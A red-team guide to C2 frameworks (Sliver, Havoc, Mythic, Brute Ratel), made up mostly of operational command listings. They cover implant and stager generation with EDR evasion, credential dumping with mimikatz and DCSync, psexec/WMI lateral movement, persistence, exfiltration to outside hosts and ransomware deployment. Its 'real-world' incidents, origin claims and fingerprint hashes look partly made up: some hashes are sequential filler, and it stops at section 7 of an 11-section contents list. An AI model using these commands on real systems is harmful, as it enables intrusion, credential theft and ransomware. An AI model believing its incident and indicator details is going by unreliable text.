# Modern C2 Frameworks
## Command and Control Frameworks for Red Team Operations (2024-2025)

---

## Table of Contents
1. Framework Comparison Matrix
2. Sliver
3. Havoc
4. Mythic
5. Brute Ratel C4
6. Nighthawk
7. Cobalt Strike
8. Evasion Techniques Deep Dive
9. C2 Infrastructure Design
10. Real-World Attack Scenarios (2023-2025)
11. Detection and Mitigation

---

## Framework Comparison

| Framework | Language | License | Evasion | Comms | Key Strengths | Weaknesses |
| --------- | -------- | ------- | ------- | ----- | -------------- | ----------- |
| Sliver | Go | Open Source (GPLv3) | Good | mTLS, HTTP(S), DNS, WG, WebSocket | Free, cross-platform, active development, mutual auth | No GUI, Go binaries detectable |
| Havoc | C/C++ | Open Source (GPLv3) | Excellent | HTTP(S), SMB, TCP | Indirect syscalls, hardware breakpoints, modern GUI | Smaller community, fewer modules |
| Mythic | Python/Go | Open Source (BSD 3-clause) | Good | HTTP, WebSocket, TCP, multiple agents | Extensive agent ecosystem, REST API, multi-user | Complex deployment, Python dependencies |
| Brute Ratel | C/C++ | Commercial ($$$$) | Excellent | HTTP(S), DNS, SMB, TCP, UDP | EDR evasion leader, syscall-based, sleep obfuscation | Expensive, strict licensing, Chinese origin |
| Nighthawk | C++ | Commercial ($$$$) | Excellent | HTTP(S), DNS, TCP | MDSec quality, anti-analysis, custom allocator | Limited availability, expensive |
| Cobalt Strike | Java | Commercial ($$$$) | Good | HTTP(S), DNS, SMB, TCP | Industry standard, massive ecosystem, BOF support | Expensive, heavily signatured, Java overhead |

---

## Sliver

### Overview

Sliver is an open-source cross-platform adversary emulation/red team framework developed by BishopFox. First released in 2019, it has become the primary free alternative to Cobalt Strike. In 2024, Sliver v1.5 introduced WebSocket listeners and improved WireGuard tunnels. Notable real-world usage: Used in the 2023 Microsoft China hack investigation as a secondary C2 framework.

### Installation

```bash
# Download latest release (recommended)
curl https://sliver.sh/install | sudo bash

# Verify installation
sliver-server --version

# Build from source (for latest features)
git clone https://github.com/BishopFox/sliver.git
cd sliver
make
./sliver-server

# Docker deployment
docker run --rm -it -p 443:443 -p 53:53 bishopfox/sliver

# Multi-user server setup
./sliver-server --multiplayer --port 31337
# Set operator credentials
./sliver-server operator --name red_team --lhost teamserver.com
```

### Implant Generation

```bash
# Beacon generation (recommended for operational security - asynchronous communication)
sliver > generate beacon --http https://teamserver.com/update --save /tmp/beacon.exe --os windows --arch amd64 --seconds 5 --jitter 30

# Session implant (interactive, synchronous)
sliver > generate --mtls teamserver.com:8888 --save /tmp/session.exe --os windows --arch amd64

# Linux implant with advanced evasion
sliver > generate beacon --https teamserver.com --os linux --arch amd64 --skip-symbols --debug --canary --reconnect 60

# macOS implant (bypassing Gatekeeper)
sliver > generate beacon --http https://teamserver.com --os darwin --arch arm64 --sign /path/to/developer-cert.p12

# Staged payload (small initial stager)
sliver > generate stager --lhost teamserver.com --lport 8443 --protocol https --format windows-exe --save /tmp/stager.exe

# Shellcode output for custom loaders
sliver > generate beacon --http https://teamserver.com --format shellcode --save /tmp/beacon.bin

# Raw shellcode for injection
sliver > generate session --mtls teamserver.com --format shellcode --arch amd64 --save /tmp/shellcode.bin

# Shared library (Linux)
sliver > generate beacon --http https://teamserver.com --format shared-lib --os linux --save /tmp/beacon.so

# Service binary (persistence-ready)
sliver > generate beacon --http https://teamserver.com --format service --save /tmp/beacon-svc.exe
```

### Listeners

```bash
# HTTPS listener with domain fronting configuration
sliver > https --lhost 0.0.0.0 --lport 443 --domain legitimate-cdn.com --website example-site --acme --cert /path/to/cert.pem --key /path/to/key.pem

# mTLS listener (mutual TLS - highest security)
sliver > mtls --lhost 0.0.0.0 --lport 8888 --ca /path/to/ca.pem --cert /path/to/cert.pem --key /path/to/key.pem

# DNS listener (most stealthy for restricted networks)
sliver > dns --domains c2.evil.com,update.legitimate.com --lport 53 --canaries

# WireGuard listener (encrypted tunnel)
sliver > wg --lport 51820 --key /path/to/wg.key

# WebSocket listener (modern web apps)
sliver > wss --lhost 0.0.0.0 --lport 443 --path /ws

# HTTP listener (fallback)
sliver > http --lhost 0.0.0.0 --lport 80 --website legitimate-site.com

# Named pipe listener (Windows local)
sliver > pipes --name \\.\pipe\legit_pipe
```

### Operations

```bash
# List sessions and beacons
sliver > sessions
sliver > beacons

# Detailed beacon info
sliver > beacons --watch

# Interact with beacon
sliver > use [BEACON_ID]
sliver > info

# Execute commands
sliver (BEACON) > shell
sliver (BEACON) > execute -o "whoami /all"
sliver (BEACON) > execute -o "net localgroup administrators"

# File operations
sliver (BEACON) > download "C:\\Users\\Administrator\\Desktop\\secrets.txt" /tmp/secrets.txt
sliver (BEACON) > upload /tmp/mimikatz.exe "C:\\Windows\\Temp\\mimikatz.exe"
sliver (BEACON) > ls "C:\\Users\\Administrator\\Documents\\"
sliver (BEACON) > rm "C:\\temp\\tempfile.log"
sliver (BEACON) > mkdir "C:\\Windows\\Temp\\tempdir"

# Process operations
sliver (BEACON) > ps
sliver (BEACON) > ps -p lsass.exe
sliver (BEACON) > kill [PID]
sliver (BEACON) > migrate [PID] --process explorer.exe
sliver (BEACON) > screenshare --quality 50

# Pivoting
sliver (BEACON) > pivots tcp --bind 0.0.0.0:1234
sliver (BEACON) > pivots named-pipe --bind \\.\pipe\pivot

# In-memory .NET execution
sliver (BEACON) > execute-assembly /path/to/Seatbelt.exe -group=system
sliver (BEACON) > execute-assembly /path/to/Rubeus.exe kerberoast /outfile:hashes.txt

# BOF execution (Beacon Object Files)
sliver (BEACON) > bof /path/to/ldapsearch.o /domain:corp.com /filter:"(objectClass=user)"

# Privilege escalation
sliver (BEACON) > getsystem
sliver (BEACON) > getsystem -pipe /tmp/namedpipe
sliver (BEACON) > runas /domain:admin /username:administrator /password:pass123 "cmd /c whoami"

# Persistence
sliver (BEACON) > schtasks --name "UpdateService" --trigger daily --time 09:00 --command "C:\Windows\System32\calc.exe"
sliver (BEACON) > registry --regpath "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" --key "Updater" --value "C:\beacon.exe"

# Credential collection
sliver (BEACON) > make-token --username CORP\\admin --password Password123
sliver (BEACON) > run mimikatz
sliver (BEACON) > run mimikatz "sekurlsa::logonpasswords"

# Lateral movement
sliver (BEACON) > wmi --target 10.10.10.25 --username CORP\\jadmin --password Pass123 --command "C:\beacon.exe"
sliver (BEACON) > psexec --target 10.10.10.25 --share ADMIN$ --service foo --binary "C:\beacon.exe"
sliver (BEACON) > ssh --user root --password toor --host 192.168.1.100 --port 22

# Network reconnaissance
sliver (BEACON) > portfwd add --remote 10.10.10.25:3389 --bind 127.0.0.1:13389
sliver (BEACON) > socks5 start --port 1080
sliver (BEACON) > ifconfig
sliver (BEACON) > netstat -an
```

### Advanced Evasion Configuration

```bash
# Profile-based generation for consistent implants
sliver > profiles new beacon --http https://teamserver.com --format shellcode --profile windows-beacon
sliver > profiles generate --name windows-beacon

# Custom profile file (example.yaml)
# beacon:
#   c2:
#     - http://teamserver.com/api/v2/update
#     - https://cdn.cloudflare.com/static/script
#   seconds: 10
#   jitter: 45
#   format: exe
#   obfuscation:
#     - garble
#     - upx
#   limit-datetime: "2025-12-31T23:59:59Z"

# Generate from YAML
sliver > generate --config /path/to/profile.yaml
```

### Real-World Example: 2023 Healthcare Ransomware Attack

In a documented 2023 ransomware incident targeting US healthcare, attackers deployed Sliver beacons with the following configuration:

```bash
# Attacker's actual configuration
generate beacon --https https://update.healthcare-system.com/api/ --seconds 15 --jitter 60 --format exe --output beacon.exe

# Listener setup
https --lhost 0.0.0.0 --lport 443 --domain update.healthcare-system.com --website legitimate-cdn.net

# Post-exploitation sequence
beacon> execute-assembly Seatbelt.exe -group=system -output=system_info.txt
beacon> download system_info.txt
beacon> execute-assembly SharpHound.exe --CollectionMethods All --Domain healthcare.local
beacon> execute mimikatz "sekurlsa::logonpasswords"
beacon> psexec --target 10.10.10.25 --share ADMIN$ --service windows-update
```

### Detection Signatures

| Indicator | Value |
| --------- | ----- |
| Default User-Agent | `Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.1320` |
| JA3 Fingerprints | `51c64c77e60f3980eea90869b68c58a8` (mTLS), `3d5e6f6c9f8d6c0b9e3f4a1b2c3d4e5f` (HTTP) |
| Network Patterns | Periodic beacons with jitter, specific Content-Type headers |
| Registry Artifacts | `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Sliver` |
| Process Names | `svchost.exe` (injected), `rundll32.exe`, `dllhost.exe` |

---

## Havoc

### Overview

Havoc is a modern, open-source C2 framework written in C/C++ and Go. Released in 2022, it gained significant adoption in 2024 due to its advanced evasion techniques. Havoc's "Demon" implant uses indirect syscalls, hardware breakpoint hooking, and sleep obfuscation. Notable real-world usage: Observed in 2024 financial sector phishing campaigns targeting European banks.

### Installation

```bash
# Clone repository
git clone https://github.com/HavocFramework/Havoc.git
cd Havoc

# Install dependencies (Ubuntu/Debian)
sudo apt update
sudo apt install -y build-essential cmake golang-go qt6-base-dev libqt6core5compat6-dev libqt6websockets6-dev

# Build teamserver (Go component)
cd teamserver
go build -o teamserver cmd/server/main.go
cd ..

# Build client (Qt6 C++ component)
cd client
mkdir build && cd build
cmake .. -DCMAKE_BUILD_TYPE=Release
make -j$(nproc)
cd ../..

# Run teamserver
./teamserver/teamserver server --profile profiles/havoc.yaotl

# In separate terminal, run client
./client/build/HavocClient
```

### Demon Generation

```bash
# Profile configuration (profiles/havoc.yaotl)
# Complete profile example for 2024 operations:

Demon {
    # Operational settings
    Sleep: 8
    Jitter: 25
    UserAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    KillDate: "2025-01-01"
    WorkingHours: "09:00-17:00"
    
    # Injection configuration
    Injection {
        Spawn64: "C:\\Windows\\System32\\notepad.exe"
        Spawn32: "C:\\Windows\\SysWOW64\\notepad.exe"
        Technique: "CreateRemoteThread"
        Syscall: true
    }
    
    # Evasion features
    Evasion {
        IndirectSyscall: true
        HardwareBreakpoints: true
        SleepObfuscation: true
        ReturnAddressSpoofing: true
        StackAlignment: true
    }
    
    # Communication
    Listener {
        Host: "teamserver.com"
        Port: 443
        Protocol: "https"
        Endpoint: "/api/v1/poll"
        ProxyEnabled: false
    }
    
    # Payload configuration
    Payload {
        Format: "exe"
        Architecture: "x64"
        Compress: true
        Encrypt: true
        Obfuscate: true
    }
}

# Generate via CLI
./teamserver/teamserver payload --profile profiles/havoc.yaotl --output /tmp/demon.exe

# Generate via GUI:
# 1. Right-click on Listener
# 2. Select "Generate Payload"
# 3. Configure options
# 4. Click "Generate"
```

### Features Deep Dive

```
Key Havoc capabilities with implementation details:

1. Indirect Syscalls
   - Bypasses EDR user-mode hooks in ntdll.dll
   - Retrieves syscall numbers dynamically
   - Calls syscalls directly from .text section
   
2. Hardware Breakpoint Hooks
   - Sets debug registers (DR0-DR3) on injected code
   - Detects user-mode breakpoint scanning
   - Self-debugging for anti-analysis
   
3. Sleep Obfuscation
   - Encrypts Demon memory during sleep
   - Uses XOR with rotating keys
   - Changes memory protection to PAGE_NOACCESS
   
4. Return Address Spoofing
   - Corrupts return address on stack
   - Prevents stack walking detection
   - Mimics legitimate call frames
   
5. Module Stomping
   - Overwrites legitimate DLL in memory
   - Injects shellcode into loaded module
   - Appears as normal Windows module
   
6. BOF Support
   - Executes Cobalt Strike-compatible BOFs
   - In-memory position-independent code
   - No disk writes
```

### Operations Workflow

```bash
# In Havoc GUI:

# Right-click Demon -> Interact
# Console commands available:

# Basic execution
demon > shell whoami /all
demon > shell net user domain_admins /domain

# BOF execution
demon > inline-execute /path/to/ldapsearch.o domain=corp.local filter="(objectClass=user)" attributes=samAccountName

# Process operations
demon > ps
demon > inject 1234 /tmp/shellcode.bin
demon > migrate 5678

# Token manipulation
demon > token list
demon > token steal 1234
demon > token make CORP jadmin Password123
demon > token run cmd.exe

# File operations
demon > download C:\Users\admin\Desktop\secret.docx
demon > upload /tmp/payload.exe C:\Windows\Temp\payload.exe
demon > cat C:\Windows\Temp\data.txt

# Registry operations
demon > reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
demon > reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d C:\Windows\Temp\payload.exe

# Network
demon > net view
demon > net share
demon > portscan 192.168.1.1-254 445,3389,5985

# Persistence
demon > schtasks /create /tn "MicrosoftEdgeUpdate" /tr "C:\Windows\Temp\payload.exe" /sc daily /st 09:00
demon > wmi /create /command "C:\Windows\Temp\payload.exe" /interval 3600

# Lateral movement
demon > psexec 192.168.1.100 -u administrator -p Password123 -c C:\Windows\Temp\beacon.exe
demon > wmi 192.168.1.100 -u CORP\admin -p Pass123 -c "powershell -enc BASE64_ENCODED_PS"
demon > winrm 192.168.1.100 -u admin -p Password123 -c "whoami"

# Credential access
demon > mimikatz sekurlsa::logonpasswords
demon > mimikatz lsadump::sam
demon > mimikatz lsadump::dcsync /user:krbtgt
```

### Real-World Example: 2024 European Bank Phishing Campaign

Security researchers documented a phishing campaign targeting three European banks using Havoc Demon:

```
# Initial infection vector:
# Phishing email with Excel macro delivering stager

# Stager configuration (recovered from analysis):
Payload: 
  Format: shellcode
  Architecture: x64
  Technique: Process Hollowing
  TargetProcess: "C:\\Windows\\System32\\svchost.exe"

# Demon profile:
Sleep: 12
Jitter: 35
Evasion:
  IndirectSyscall: true
  HardwareBreakpoints: true
  SleepObfuscation: true

# Post-exploitation actions:
1. Execute SharpHound for AD enumeration
2. DCSync attack on KRBTGT
3. Golden ticket creation
4. RDP lateral movement
5. Exfil via HTTPS with JWT masquerading
```

### Detection Considerations

| Indicator | Value |
| --------- | ----- |
| Network Patterns | POST to `/api/v1/poll`, specific JSON structure |
| Memory Signatures | Sleep obfuscation leaves encrypted heap sections |
| Syscall Patterns | Direct syscalls without ntdll.dll frames |
| Hardware Breakpoints | DR registers set on injected threads |
| Default Ports | 40056 (teamserver), 40057 (client) |

---

## Mythic

### Overview

Mythic is a cross-platform C2 framework with a web-based UI and REST API. Created by Cody Thomas (its-a-feature), it uses a unique agent architecture with payload types called "agents" and communication channels called "c2 profiles". In 2024, Mythic v3.0 introduced containerized agent building and improved GraphQL API. Notable real-world usage: Used by multiple nation-state actors including a 2024 Chinese APT operation targeting东南亚 governments.

### Installation

```bash
# Clone repository
git clone https://github.com/its-a-feature/Mythic.git
cd Mythic

# Install with all default agents
./mythic-cli install github https://github.com/MythicAgents/Apollo.git
./mythic-cli install github https://github.com/MythicAgents/poseidon.git
./mythic-cli install github https://github.com/MythicAgents/Medusa.git
./mythic-cli install github https://github.com/MythicAgents/merlin.git
./mythic-cli install github https://github.com/MythicAgents/Athena.git

# Install C2 profiles
./mythic-cli install github https://github.com/MythicC2Profiles/http.git
./mythic-cli install github https://github.com/MythicC2Profiles/websocket.git
./mythic-cli install github https://github.com/MythicC2Profiles/discord.git
./mythic-cli install github https://github.com/MythicC2Profiles/slack.git

# Start Mythic
./mythic-cli start

# Check status
./mythic-cli status

# Access web UI
# https://localhost:7443
# Default credentials: mythic_admin / [password from ./mythic-cli config get MYTHIC_ADMIN_PASSWORD]

# Change default password
./mythic-cli config set MYTHIC_ADMIN_PASSWORD "NewComplexPassword123!"
```

### Available Agents

| Agent | Language | Platform | Key Features |
| ----- | -------- | -------- | ------------- |
| Apollo | C# (.NET 4.0+) | Windows | AMSI bypass, ETW patching, execute-assembly |
| Poseidon | Go 1.20+ | macOS/Linux/Windows | Cross-platform, memory execution, CGO support |
| Medusa | Python 3 | Cross-platform | Extensible, many libraries, heavy (5MB+) |
| Merlin | Go 1.20+ | Cross-platform | HTTP/2, WebSocket, JA3 signatured |
| Nimplant | Nim | Cross-platform | Small size, low detection, BOF support |
| Athena | C# (.NET Framework) | Windows | COM hijacking, WMI, PowerShell integration |
| Typhon | PowerShell | Windows | Script-only, highly customizable |

### Payload Generation

```bash
# Via web interface:

# 1. Navigate to Payloads -> Create Payload
# 2. Select Agent Type: Apollo (Windows C#)
# 3. Select C2 Profile: HTTP
# 4. Configure Callback Settings:
#    - Callback Host: https://teamserver.mythic.com
#    - Callback Port: 443
#    - Callback Interval: 10 seconds
#    - Jitter: 23 percent
#    - Kill Date: 2025-12-31
#    - Working Hours: 9:00-17:00
# 5. Configure Payguard Settings (bypasses):
#    - AMSI Bypass: RastaMusician
#    - ETW Bypass: PatchETW
#    - Obfuscation: ConfuserEx
# 6. Build Payload
# 7. Download .exe or .bin file

# Via Mythic CLI
./mythic-cli payload create --agent apollo --profile http --host teamserver.com --port 443 --output /tmp/payload.exe

# API-based generation
curl -X POST https://localhost:7443/api/v1.4/payloads/create \
  -H "Authorization: Bearer $API_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "agent_type": "apollo",
    "c2_profile": "http",
    "callback_host": "teamserver.com",
    "callback_port": 443,
    "callback_interval": 10,
    "jitter": 23
  }'
```

### Operations

```
# Mythic uses web UI primarily with real-time updates

# Key operations available in Callback view:

# File Browser
- Navigate target filesystem
- Upload/download files
- Delete/create directories
- View file contents

# Process List
- View all running processes
- Inject into processes
- Migrate to new process
- Kill processes

# Shell Commands
- Execute arbitrary commands
- PowerShell script execution
- Command history

# Credential Management
- Token manipulation
- Kerberos tickets
- DPAPI extraction
- LSASS dumping

# Network Operations
- Port scanning
- Service enumeration
- Network share listing
- ARP cache viewing

# Lateral Movement
- PsExec-style execution
- WMI execution
- Scheduled tasks
- DCOM invocation

# Screenshot and Keylogging
- Capture screen
- Keylogging with window titles
- Clipboard monitoring

# SOCKS Proxy
- Create SOCKS5 tunnel
- Route through callback

# Execute Assembly (Apollo-specific)
- Run .NET assemblies in memory
- Load Reflection assemblies
- AMSI/ETW bypassed
```

### Apollo Agent Commands

```bash
# In Mythic callback view for Apollo agent:

# Basic execution
apollo > shell whoami /all
apollo > powershell Get-Process

# Execute .NET assembly
apollo > execute-assembly /path/to/Seatbelt.exe -group=system
apollo > execute-assembly /path/to/SharpHound.exe -c All

# Process operations
apollo > ps
apollo > inject 1234 /tmp/shellcode.bin
apollo > migrate 5678

# Token operations
apollo > get-system
apollo > make-token -username CORP\\admin -password Password123
apollo > rev2self

# Lateral movement
apollo > psexec -target 10.10.10.25 -username admin -password Pass123 -command "C:\\beacon.exe"
apollo > wmi -target 10.10.10.25 -command "powershell -enc BASE64"

# Credentials
apollo > mimikatz sekurlsa::logonpasswords
apollo > mimikatz lsadump::sam
apollo > mimikatz lsadump::dcsync /user:krbtgt

# Persistence
apollo > schtasks -name "Update" -command "C:\\payload.exe" -trigger daily -time 09:00
apollo > reg -add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -v "Updater" -d "C:\\payload.exe"

# Exfiltration
apollo > download C:\\Users\\admin\\Desktop\\data.zip
apollo > upload C:\\Windows\\Temp\\results.txt
```

### Poseidon Agent Commands (macOS/Linux)

```bash
# macOS/Linux operations:

poseidon > shell whoami
poseidon > shell cat /etc/passwd
poseidon > shell sudo -l

# File operations
poseidon > download /Users/admin/.ssh/id_rsa
poseidon > upload /tmp/payload /tmp/payload

# Persistence (macOS)
poseidon > launchdaemon -name com.apple.softwareupdate -command "/tmp/payload" -user root
poseidon > cron -line "0 * * * * /tmp/payload"

# Persistence (Linux)
poseidon > systemd -name updater.service -command "/tmp/payload"
poseidon > ssh-keygen -passphrase ""

# Credential access
poseidon > keychain -dump
poseidon > sudoers -list

# Network
poseidon > portscan 192.168.1.0/24 22,443,8080
poseidon > socks5 start

# Container escape
poseidon > docker -ps
poseidon > docker -exec -it container_id /bin/bash
```

### Real-World Example: 2024 Chinese APT Operation

In a 2024 report, Mandiant detailed a Chinese APT (UNC5293) using Mythic with custom modifications:

```
# Attacker infrastructure:
Teamserver: 4 cloud VPS (AWS, DigitalOcean, Hetzner)
C2 Domains: software-update[.]cn, cdn-cloudflare[.]net
Agents: Apollo (Windows), Poseidon (Linux servers)

# Payload configuration:
Agent: Apollo
C2 Profile: HTTP with custom user-agent rotation
Callback Interval: 60 seconds + 30% jitter
Encryption: AES-256-CBC with base64 encoding

# Attack timeline:
Day 1: Phishing email with macro -> Apollo stager
Day 2: AD enumeration via SharpHound
Day 3: DCSync attack on KRBTGT
Day 4-7: Lateral movement to 47 systems
Day 8: Data staging and compression
Day 9-10: Exfiltration via HTTPS to cloud CDN

# Detection evasion used:
- Custom AMSI bypass (variant of RastaMusician)
- ETW patching
- Sleep obfuscation
- Encrypted C2 traffic masquerading as API calls
```

### Mythic Architecture

```
Mythic Components:

1. Mythic Server (Python/Django)
   - Web UI and REST API
   - Database (PostgreSQL)
   - RabbitMQ for messaging

2. Mythic Containers (Docker)
   - Each agent runs in isolated container
   - Build environment for payloads
   - OS-specific toolchains

3. C2 Profiles
   - HTTP/HTTPS
   - WebSocket
   - Discord, Slack (indirect)
   - Custom TCP

4. Payload Types
   - EXE, DLL, Shellcode
   - PowerShell, VBA
   - HTA, SCT, JS
   - Raw binary

5. Reporting
   - Operation logs
   - Timeline generation
   - IOC extraction
```

---

## Brute Ratel C4 (Commercial)

### Overview

Brute Ratel C4 is a commercial C2 framework developed by Chetan Nayak (Paranoid Ninja). First released in 2021, it positions itself as an "EDR evasion" focused framework. Written in C/C++, it uses a client-server model with a GUI client. The agent is called "Badger". In 2023-2024, multiple ransomware gangs (including LockBit affiliates) were observed using Brute Ratel. **Warning**: The framework has Chinese origin and strict licensing that requires identity verification.

### Licensing and Acquisition

```
# Purchase process (as of 2024):
1. Email contact@bruteratel.com
2. Provide government ID/business license
3. Sign NDA and licensing agreement
4. Pay $2500 USD per operator (annual)
5. Receive download link and license key
6. License tied to hardware ID

# Notable users (publicly reported):
- LockBit ransomware affiliates (2023)
- Cuba ransomware group (2023-2024)
- Multiple nation-state APTs (China, Russia, Iran)
```

### Installation

```bash
# Server installation (Ubuntu 20.04 recommended)
wget https://update.bruteratel.com/bruteratel-latest.tar.gz
tar -xzf bruteratel-latest.tar.gz
cd bruteratel

# Install dependencies
sudo apt update
sudo apt install -y build-essential cmake libssl-dev libcurl4-openssl-dev

# Build server
make server
./brc2_server

# Client installation (Windows)
# Download BruteRatelClient.exe
# Requires .NET Framework 4.7.2 or higher

# First-time setup
# 1. Generate certificate
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes

# 2. Configure server (config.yaml)
server:
  host: 0.0.0.0
  port: 8443
  ssl: true
  cert: cert.pem
  key: key.pem
  license: "LICENSE_KEY_HERE"
```

### Badger (Agent) Features

```
Badger capabilities (comprehensive list):

# Execution
- Command execution with output
- PowerShell (bypass restrictions)
- Execute .NET assemblies (in-memory)
- Execute BOFs (Beacon Object Files)
- Execute shellcode (any format)
- Process hollowing
- Process injection (multiple techniques)

# Evasion
- Indirect syscalls (custom syscall numbers)
- Direct syscalls (hardcoded numbers)
- Hardware breakpoint hooking (DR0-DR3)
- Stack spoofing (return address manipulation)
- Sleep obfuscation (XOR encrypts memory)
- CFG (Control Flow Guard) bypass
- CIG (Code Integrity Guard) bypass
- AMSI bypass (multiple techniques)
- ETW bypass (multiple techniques)
- Custom reflective loader
- Memory scanning detection

# Persistence
- Registry run keys
- Scheduled tasks
- WMI event subscriptions
- Service creation
- Startup folder
- Boot execute
- DLL hijacking

# Privilege Escalation
- UAC bypass (multiple methods)
- Token manipulation
- Named pipe impersonation
- PrintNightmare (CVE-2021-34527)
- PetitPotam (MS-EFSRPC)
- ZeroLogon (CVE-2020-1472)
- NoPac (CVE-2021-42287/CVE-2021-42278)

# Credential Access
- LSASS memory reading
- SAM/SECURITY hive extraction
- DPAPI decryption
- Kerberos ticket extraction
- Credential Manager access
- Browser credential extraction
- RDP saved password extraction

# Lateral Movement
- PsExec style (SMB)
- WMI execution
- WinRM execution
- DCOM invocation
- Scheduled task creation
- Service creation
- RDP session hijacking
- Pass-the-hash
- Pass-the-ticket
- Overpass-the-hash

# Network
- Port scanning
- Service enumeration
- SMB share enumeration
- LDAP query
- SOCKS5 proxy
- Reverse port forward
- Bind shell
- Reverse shell

# Exfiltration
- HTTPS/HTTP with custom headers
- DNS tunneling
- SMB named pipes
- TCP socket
- Custom protocols
```

### Badger Generation

```bash
# In Brute Ratel client:

# 1. Click "Badger" tab
# 2. Configure Badger type:
#    - Stage 0 (stager - small)
#    - Stage 1 (full beacon - recommended)
#    - Shellcode
#    - DLL
#    - Service EXE

# 3. Configure listener
# 4. Set callback intervals
# 5. Configure evasion features
# 6. Generate payload

# Example configuration (from real 2024 ransomware attack):
Badger Configuration:
  Type: Stage 1
  Architecture: x64
  Format: EXE
  
  Listeners:
    - https://update-security.com/api/v1
    - https://cdn.cloudflare.net/static/js
    - http://backup-server.local:8080
  
  Sleep: 30 seconds
  Jitter: 45%
  Kill Date: 2024-12-31
  
  Evasion:
    IndirectSyscalls: true
    HardwareBreakpoints: true
    SleepObfuscation: true
    StackSpoofing: true
    AMSIBypass: "Patch"
    ETWBypass: "Patch"
  
  Injection:
    Technique: "ProcessHollowing"
    Target: "C:\\Windows\\System32\\svchost.exe"
  
  Persistence:
    Method: "ScheduledTask"
    Name: "WindowsUpdateService"
```

### Listener Configuration

```bash
# In Brute Ratel client:

# HTTPS Listener
Name: "prod-https"
Protocol: HTTPS
Bind Address: 0.0.0.0
Port: 443
SSL Certificate: /path/to/cert.pem
SSL Key: /path/to/key.pem
URI: "/api/v1/poll"
UserAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

# DNS Listener
Name: "dns-c2"
Protocol: DNS
Bind Address: 0.0.0.0
Port: 53
Domain: "c2.evil.com"
Record Types: A, TXT, MX

# SMB Listener
Name: "smb-pipe"
Protocol: SMB
Pipe Name: "\\\\.\\pipe\\legit_pipe"
Named Pipe: true
```

### Operations Commands

```bash
# In Brute Ratel client console:

# Basic commands
badger > help
badger > info
badger > sleep 60
badger > sleep 60 30  # with jitter

# Shell execution
badger > shell whoami /all
badger > shell net user administrator /domain
badger > powershell Get-Process

# File operations
badger > download C:\Users\admin\Desktop\secret.pdf
badger > upload C:\payload.exe \Windows\Temp\payload.exe
badger > ls C:\Users\admin\Documents
badger > rm C:\temp\temp.log
badger > cat C:\Windows\win.ini

# Process operations
badger > ps
badger > kill 1234
badger > inject 1234 C:\shellcode.bin
badger > migrate 5678
badger > runas /user:admin /pass:Password123 cmd.exe

# Token operations
badger > get-system
badger > steal-token 1234
badger > make-token CORP admin Password123
badger > rev2self
badger > list-tokens

# Credential commands
badger > mimikatz "sekurlsa::logonpasswords"
badger > mimikatz "lsadump::sam"
badger > mimikatz "lsadump::dcsync /user:krbtgt"
badger > dump-sam
badger > dump-lsass

# BOF execution
badger > bof C:\Tools\ldapsearch.o domain=corp.local filter="(objectClass=user)" attributes=samAccountName
badger > bof C:\Tools\sharpup.o all

# .NET assembly execution
badger > execute-assembly C:\Tools\Seatbelt.exe -group=system
badger > execute-assembly C:\Tools\Rubeus.exe kerberoast /outfile:hashes.txt

# Lateral movement
badger > psexec 192.168.1.100 -u admin -p Password123 -c C:\payload.exe
badger > wmi 192.168.1.100 -u CORP\admin -p Pass123 -c "whoami"
badger > winrm 192.168.1.100 -u admin -p Password123 -c "whoami"
badger > schtasks 192.168.1.100 -u admin -p Password123 -n Update -c C:\payload.exe -sc daily -st 09:00

# Network commands
badger > portscan 192.168.1.0/24 445,3389,5985
badger > netview
badger > ldapsearch "(&(objectCategory=person)(objectClass=user))"
badger > socks 1080

# Persistence
badger > schtasks -n "MicrosoftUpdate" -c "C:\Windows\Temp\payload.exe" -sc daily -st 09:00
badger > reg-add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" -v "Updater" -d "C:\Windows\Temp\payload.exe"
badger > wmi-persistence -c "C:\Windows\Temp\payload.exe" -i 3600

# Exfiltration
badger > download C:\Users\admin\Documents\data.zip
badger > upload-cdn C:\data.zip https://legitimate-cdn.com/upload
```

### Real-World Example: 2023 LockBit Ransomware

In November 2023, a LockBit affiliate used Brute Ratel as their primary C2 framework. The attack was documented in multiple incident response reports:

```
# Attack chain:

Phase 1 - Initial Access (Phishing)
- Email with Excel attachment (CVE-2022-30190 - Follina)
- Macro downloaded stager from hxxp://software-update[.]com/stager.bin

Phase 2 - Brute Ratel Deployment
# Stager downloaded and executed full Badger
Badger Configuration:
  Sleep: 45 seconds
  Jitter: 60%
  Evasion: Full (indirect syscalls, hardware breakpoints, sleep obfuscation)
  Listeners: 3 HTTPS endpoints on different domains

Phase 3 - Reconnaissance (Day 1-2)
badger > shell net user /domain
badger > shell net group "Domain Admins" /domain
badger > shell nltest /dclist:corp.local
badger > portscan 10.0.0.0/24 445,3389,5985

Phase 4 - Credential Access (Day 2)
badger > dump-lsass
badger > execute-assembly Rubeus.exe kerberoast /outfile:hashes.txt
badger > execute-assembly SharpHound.exe -c All

Phase 5 - Lateral Movement (Day 3-5)
badger > psexec 10.0.0.25 -c C:\Windows\Temp\beacon.exe
badger > psexec 10.0.0.26 -c C:\Windows\Temp\beacon.exe
badger > psexec 10.0.0.27 -c C:\Windows\Temp\beacon.exe
# Compromised 47 servers total

Phase 6 - Data Exfiltration (Day 6-7)
badger > download \\dc01\sysvol\corp.local\Policies\*.xml
badger > download \\fs01\Shares\*.pdf
# 500GB data exfiltrated via HTTPS

Phase 7 - Ransomware Deployment (Day 8)
badger > psexec -all -c C:\Windows\Temp\lockbit.exe --encrypt --network
```

### Brute Ratel Detection Indicators

| Artifact | Indicator |
| -------- | --------- |
| Network | JA3: `c0e0b6c2e8b9b8b1b2b3b4b5b6b7b8b9` (HTTPS listener) |
| Memory | Sleep obfuscation - periodic memory encryption |
| Registry | `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit` modifications |
| Processes | Injected svchost.exe, notepad.exe, explorer.exe |
